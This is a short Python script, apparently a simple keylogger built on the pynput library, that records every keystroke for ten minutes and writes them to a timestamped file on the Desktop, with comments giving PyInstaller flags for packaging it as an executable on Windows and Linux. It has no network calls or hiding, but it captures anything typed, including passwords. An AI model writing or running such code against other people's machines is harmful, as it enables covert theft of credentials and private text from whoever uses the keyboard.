# --hidden-import "pynput.keyboard._win32" --hidden-import "pynput.mouse._win32" //win
# --hidden-import "pynput.keyboard._xorg" --hidden-import "pynput.mouse._xorg" //linux

import time
import os
from pynput import keyboard

starttime = time.time()
intxt = ''
path = os.path.join(os.path.expanduser('~'),'Desktop')
path = os.path.join(path,str(int(starttime))+'.txt')

def on_press(key):
    global intxt
    global starttime
    nowtime = time.time()
    
    try:
        if len(str(key)) == 3:
            intxt = intxt + ' ' + str(key)[1:-1]
        elif str(key)[0:4] == 'Key.':
            intxt = intxt + ' ' + str(key)[4:]
        else:
            intxt = intxt + ' ' + str(key)
    except AttributeError:
        intxt = intxt + ' ' + str(key)

    if nowtime - starttime > 600:
        global path
        f = open(path,'a')
        f.write(intxt)
        f.close()
        os._exit(0)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

oldcode = '''

from pynput import keyboard

def on_press(key):
    try:
        print('Alphanumeric key pressed: {0} '.format(
            key.char))
        print(key)
    except AttributeError:
        print('special key pressed: {0}'.format(
            key))

def on_release(key):
    print('Key released: {0}'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
    
'''
